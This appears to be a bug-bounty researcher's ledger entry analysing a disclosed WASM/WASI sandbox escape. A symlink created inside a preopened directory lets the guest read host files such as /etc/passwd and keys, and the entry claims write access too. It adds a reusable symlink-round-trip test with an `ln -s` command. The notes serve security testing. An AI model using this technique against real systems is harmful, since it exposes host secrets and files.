CHAIN: untrusted WASM/WASI guest believed confined to its preopens (primitive) -> symlink inside a preopen pointing outside (primitive: creation admitted where the LINK LIVES, not where it POINTS) -> open/read through the link (escalation: arbitrary host file READ — /etc/passwd, keys, source, secrets) -> same pattern with write rights (asserted in Impact) = arbitrary host file WRITE -> full host compromise. Honest limit: READ demonstrated, write asserted; no RCE beyond file write; Node.js treats the "sandbox" as never-a-security-boundary (Medium 4.8, docs fix).
TRANSFERABLE TEST: on every sandbox granting path-scoped file access, run the symlink round-trip: inside the allowed dir create a symlink to a canary OUTSIDE it (`path_symlink`/`ln -s /etc/hostname ./canary`, or a tar/zip/git symlink entry per playbook V-11 when only uploads can create links), open+read it through the sandbox's NORMAL open/read path; canary bytes returned = confinement bypass. Repeat as a WRITE (link to a temp file outside, write through it, check the outside file). Rule: **path confinement that checks the LOOKUP NAME but not the RESOLVED link target is not confinement — a symlink inside the allowed directory is a door to the whole filesystem.**
DEDUPE/DELTA: `path_symlink`/`preopen` = 0 hits across all three write targets; `2084280`/`jessewilson` = 0 hits. Related-but-distinct REVIEWED and NOT re-recorded: playbook V-11 (Bugbountyskills.md ~7452 — symlink planted via TAR/ZIP/GIT UPLOAD entries + later app-side read, classed LFI) — same underlying principle (symlink following defeats directory confinement), different entry mechanism (this one: the SANDBOX'S OWN syscall creates the link, no upload needed; classed sandbox escape); `sandbox-escape-testing` playbook (Bugbountyskills.md ~8861-9280) has NO symlink variant. NEW: lookup-vs-resolution containment gap as a sandbox-escape mechanism + syscall-level test — ledger entry only (no §17 slot: the principle is owned by V-11; delta = carrier + read/write reach).
FRESHNESS: created 2023-07-25, disclosed 2025-05-24 — ~18 months old, just outside the preferred 6-12 month window (read because assigned).
